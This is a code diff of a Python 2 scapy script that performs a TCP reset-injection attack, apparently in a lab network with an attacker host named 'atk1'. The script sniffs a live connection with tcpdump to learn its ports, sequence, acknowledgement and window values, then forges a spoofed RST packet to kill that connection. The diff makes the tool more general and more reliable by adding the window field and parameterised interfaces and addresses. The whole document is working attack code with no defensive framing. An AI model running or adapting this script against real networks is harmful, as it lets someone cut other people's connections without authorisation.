@@ -17,7 +17,7 @@ def log(s, col="green"):
 	print T.colored(s, col)
 
 
-def send_rst_packet(srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum):
+def send_rst_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):
 	log('sending RST packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')
 
 	tcp = TCP(flags="RA")
@@ -25,6 +25,7 @@ def send_rst_packet(srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackN
 	tcp.dport=int(dstPort)
 	tcp.seq=int(seqNum)
 	tcp.ack=int(ackNum)
+	tcp.window=int(win)
 
 	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=255)/tcp
 
@@ -32,7 +33,7 @@ def send_rst_packet(srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackN
 
 	frame.display()
 
-	sendp(frame, iface='atk1-eth0')
+	sendp(frame, iface=iface)
 
 
 def extract_address_port(value):
@@ -45,8 +46,8 @@ def extract_address_port(value):
 	return address, port
 
 
-def extract_ports_and_numbers(row):
-	srcPort, dstPort, seqNum, ackNum = None, None, None, None
+def extract_ports_and_numbers(row, srcIP, dstIP):
+	srcPort, dstPort, seqNum, ackNum, win = None, None, None, None, None
 
 	values = row.split(' ')
 
@@ -56,7 +57,7 @@ def extract_ports_and_numbers(row):
 	b = values[4].replace(':', '').split('.')
 	dstAddr = '.'.join(b[0:4])
 
-	if srcAddr == SOURCE_ADDRESS and dstAddr == DESTINATION_ADDRESS and values[7] == 'seq':
+	if srcAddr == srcIP and dstAddr == dstIP and values[7] == 'seq':
 		srcPort = a[4]
 		dstPort = b[4]
 
@@ -69,7 +70,9 @@ def extract_ports_and_numbers(row):
 
 		ackNum = values[10].replace(',', '')
 
-	return srcPort, dstPort, seqNum, ackNum
+		win = values[12].replace(',', '')
+
+	return srcPort, dstPort, seqNum, ackNum, win
 
 
 def retrieve_atk1_mac_address(iface):
@@ -101,16 +104,12 @@ def extract_r2_mac_addresses(row, ip_address):
 
 
 def retrieve_r2_mac_address(iface, ip_address):
-	print 'retrieving r2 mac addres'
-
 	p = Popen(('sudo', 'tcpdump', '-i', iface, '-lnSe'), stdout=PIPE)
 
 	r2_mac_address = None
 
 	for row in iter(p.stdout.readline, b''):
 		r2_mac_address = extract_r2_mac_addresses(row, ip_address)
-
-		print r2_mac_address
 
 		if r2_mac_address != None:
 			p.kill()
@@ -120,42 +119,44 @@ def retrieve_r2_mac_address(iface, ip_address):
 	return r2_mac_address
 
 
-def retrieve_ports_and_numbers():
-	p = Popen(('sudo', 'tcpdump', '-i', 'atk1-eth1', '-lnS'), stdout=PIPE)
+def retrieve_ports_and_numbers(iface, srcIP, dstIP):
+	p = Popen(('sudo', 'tcpdump', '-i', iface, '-lnS'), stdout=PIPE)
 
-	srcPort, dstPort, seqNum, ackNum = None, None, None, None
+	srcPort, dstPort, seqNum, ackNum, win = None, None, None, None, None
 
 	for row in iter(p.stdout.readline, b''):
-		srcPort, dstPort, seqNum, ackNum = extract_ports_and_numbers(row)
+		srcPort, dstPort, seqNum, ackNum, win = extract_ports_and_numbers(row, srcIP, dstIP)
 
-		if srcPort and dstPort and seqNum and ackNum:
+		if srcPort and dstPort and seqNum and ackNum and win:
 			p.kill()
 
-			return srcPort, dstPort, seqNum, ackNum
+			return srcPort, dstPort, seqNum, ackNum, win
 
-		srcPort, dstPort, seqNum, ackNum = None, None, None, None
+		srcPort, dstPort, seqNum, ackNum, win = None, None, None, None, None
 
 
 def main():
-	src_mac_address = retrieve_atk1_mac_address('atk1-eth0')
+	src_mac_address = retrieve_atk1_mac_address('atk1-eth1')
 	assert src_mac_address is not None
 	print 'source MAC address', src_mac_address
 
-	dst_mac_address = retrieve_r2_mac_address('atk1-eth1', '9.0.1.1')
+	dst_mac_address = retrieve_r2_mac_address('atk1-eth1', DESTINATION_ADDRESS)
 	assert dst_mac_address is not None
 	print 'destination MAC address', dst_mac_address
 
-	srcPort, dstPort, seqNum, ackNum = retrieve_ports_and_numbers()
+	srcPort, dstPort, seqNum, ackNum, win = retrieve_ports_and_numbers('atk1-eth1', SOURCE_ADDRESS, DESTINATION_ADDRESS)
 	assert srcPort is not None
 	assert dstPort is not None
 	assert seqNum is not None
 	assert ackNum is not None
+	assert win is not None
 	print 'source port', srcPort
 	print 'destination port', dstPort
 	print 'sequence number', seqNum
 	print 'acknowledge number', ackNum
+	print 'window', win
 
-	send_rst_packet(src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum)
+	send_rst_packet('atk1-eth1', src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
 
 
 if __name__ == "__main__":
